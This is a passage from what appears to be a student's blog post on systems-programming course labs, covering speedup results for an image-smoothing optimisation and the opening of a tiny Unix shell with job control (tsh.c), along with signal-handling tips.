CPEs	695.0	698.0	702.0	717.0	722.0</span><br><span class="line">Speedup		    43.0	44.4	43.8	46.3	46.0	44.7</span><br><span class="line"></span><br><span class="line">Smooth: Version = smooth_2: boundary separation:</span><br><span class="line">Dim		        32	    64	    128	    256	    512	    Mean</span><br><span class="line">Your CPEs	    12.3	11.9	11.4	12.0	12.1</span><br><span class="line">Baseline CPEs	695.0	698.0	702.0	717.0	722.0</span><br><span class="line">Speedup		    56.5	58.6	61.6	59.9	59.7	59.2</span><br><span class="line"></span><br><span class="line">Smooth: Version = smooth_3: boundary separtion + loop unrolling:</span><br><span class="line">Dim		        32	    64	    128	    256	    512	    Mean</span><br><span class="line">Your CPEs	    7.3	    7.3	    7.7	    7.3	    7.5</span><br><span class="line">Baseline CPEs	695.0	698.0	702.0	717.0	722.0</span><br><span class="line">Speedup		    95.5	95.9	91.2	97.6	96.7	95.3</span><br><span class="line"></span><br><span class="line">Summary of Your Best Scores:</span><br><span class="line">  Smooth: 95.3 (smooth_3: boundary separtion + loop unrolling)</span><br></pre></td></tr></table></figure>
<p>Loop unrolling again significantly improves the performance of our
function. You can also try some advanced convolution algorithms such as
Winograd convolution and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Fast_Fourier_transform">FFT</a> if
you're interested.</p>
<h1 id="lab-6-shell-lab">Lab 6: Shell Lab</h1>
<p>You task is to write a simple shell that is able to perform
foreground and background jobs. There is not too much you should be
particularly careful of in this lab, but just to get yourself familiar
with the following functions (operations):</p>
<ul>
<li>In <code>eval(char*)</code>, block <code>SIGCHLD</code> before
<code>fork()</code> and unblock it afterward.</li>
<li>Use <code>setpid(0, 0)</code> in the child process to assign a
unique group pid to it.</li>
<li>Pass <code>-pid</code> to the first argument of function
<code>kill()</code> so that it operates on the group level.</li>
<li>Use <code>sleep()</code>, or better <code>sigsuspend()</code> in
<code>waitfg()</code> to pause the main process waiting for foreground
child process.</li>
<li>Use <code>WIFSTOPPED</code>, <code>WIFSIGNALED</code> and
<code>WIFEXITED</code> in <code>sigchld_handler</code> to test the state
of child processes: whether they are stopped, terminated or exited.</li>
<li>Use <code>sigprocmask()</code> to block all signals in
<code>sigchld_handler</code>. This should be applied to
<code>sigint_handler</code> and <code>sigtstp_handler</code> as
well.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tsh - A tiny shell program with job control</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Put your name and login ID here&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misc manifest constants */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXJOBS      16   <span class="comment">/* max jobs at any point in time */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXJID    1&lt;&lt;16   <span class="comment">/* max job ID */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Job states */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEF 0 <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FG 1    <span class="comment">/* running in foreground */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BG 2    <span class="comment">/* running in background */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ST 3    <span class="comment">/* stopped */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;      <span class="comment">/* defined in libc */</span></span><br><span class="line"><span class="type">char</span> prompt[] = <span class="string">"tsh&gt; "</span>;    <span class="comment">/* command line prompt (DO NOT CHANGE) */</span></span><br><span class="line"><span class="type">int</span> verbose = <span class="number">0</span>;            <span class="comment">/* if true, print additional output */</span></span><br><span class="line"><span class="type">int</span> nextjid = <span class="number">1</span>;            <span class="comment">/* next job ID to allocate */</span></span><br><span class="line"><span class="type">char</span> sbuf[MAXLINE];         <span class="comment">/* for composing sprintf messages */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> {</span>              <span class="comment">/* The job struct */</span></span><br><span class="line">    <span class="type">pid_t</span> pid;              <span class="comment">/* job PID */</span></span><br><span class="line">    <span class="type">int</span> jid;                <span class="comment">/* job ID [1, 2, ...] */</span></span><br><span class="line">    <span class="type">int</span> state;              <span class="comment">/* UNDEF, BG, FG, or ST */</span></span><br><span class="line">    <span class="type">char</span> cmdline[MAXLINE];  <span class="comment">/* command line */</span></span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> <span class="title">jobs</span>[<span class="title">MAXJOBS</span>];</span> <span class="comment">/* The job list */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">pid_t</span> fg_pid;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">sig_atomic_t</span> fg_state = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* End global variables */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are the functions that you will implement */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_kill</span><span class="params">(<span class="type">char</span> **argv)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we've provided for you */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">sigquit_handler</span><span class="params">(<span class="type">int</span> sig)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clearjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *job)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">initjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">maxjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">addjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid, <span class="type">int</span> state, <span class="type">char</span> *cmdline)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">deletejob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span>; </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fgpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="type">job_t</span> *<span class="title function_">getjobpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="type">job_t</span> *<span class="title function_">getjobjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">int</span> jid)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">pid2jid</span><span class="params">(<span class="type">pid_t</span> pid)</span>; </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">jid2pid</span><span class="params">(<span class="type">int</span> jid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">listjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">list_cont_bgjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span>* job)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">list_terminated_fgjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span>* job)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">list_stopped_fgjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span>* job)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">app_error</span><span class="params">(<span class="type">char</span> *msg)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> <span class="title function_">handler_t</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">handler_t</span> *<span class="title function_">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - The shell's main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="type">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">"hvp"</span>)) != EOF) {</span><br><span class="line">        <span class="keyword">switch</span> (c) {</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:             <span class="comment">/* print help message */</span></span><br><span class="line">            usage();</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'v'</span>:             <span class="comment">/* emit additional diagnostic info */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'p'</span>:             <span class="comment">/* don't print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>;  <span class="comment">/* handy for automatic testing */</span></span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT,  sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler);  <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, 